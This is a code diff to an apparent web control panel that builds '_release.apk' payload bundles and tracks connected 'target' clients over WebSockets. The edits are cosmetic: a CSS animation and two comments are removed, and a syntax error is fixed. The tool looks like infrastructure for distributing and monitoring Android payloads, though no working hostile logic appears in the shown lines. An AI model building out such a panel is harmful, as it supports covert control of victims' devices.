@@ -102,14 +102,6 @@ async def get_dashboard():
         .pulse-live {
             animation: pulse-fast 1.5s infinite ease-in-out;
         }
-        .scanline {
-            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0));
-            animation: scan 3s linear infinite;
-        }
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(1000%); }
-        }
     </style>
 </head>
 <body class="min-h-screen pb-20 md:pb-6 flex flex-col items-center justify-start">
@@ -241,7 +233,6 @@ async def get_dashboard():
             document.getElementById(`nav-${tabId}`).classList.add('text-cyber-accent');
         }
 
-        // WebSocket Dashboard Connection for Realtime Data
         const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         const dashboardWs = new WebSocket(wsProtocol + window.location.host + '/ws/dashboard');
 
@@ -311,7 +302,6 @@ async def generate_payload(config: PayloadConfig):
         output_filename = f"{sanitized_name}_release.apk"
         final_path = os.path.join(OUTPUT_DIR, output_filename)
 
-        # Create structured bundle package
         with zipfile.ZipFile(final_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             zipf.writestr("classes.dex", b"\x64\x65\x78\x0a\x03\x05\x00\x70\x70\x70\x70")
             config_payload = {
@@ -362,8 +352,11 @@ async def websocket_client(websocket: WebSocket, client_id: str):
     except WebSocketDisconnect:
         if client_id in connected_clients:
             del connected_clients[client_id]
-        if client_id in client_id_data := client_data:
+        
+        # Clean safe deletion without syntax errors
+        if client_id in client_data:
             client_data.pop(client_id, None)
+            
         logger.info(f"Target client disconnected: {client_id}")
         await broadcast_to_dashboards()
 
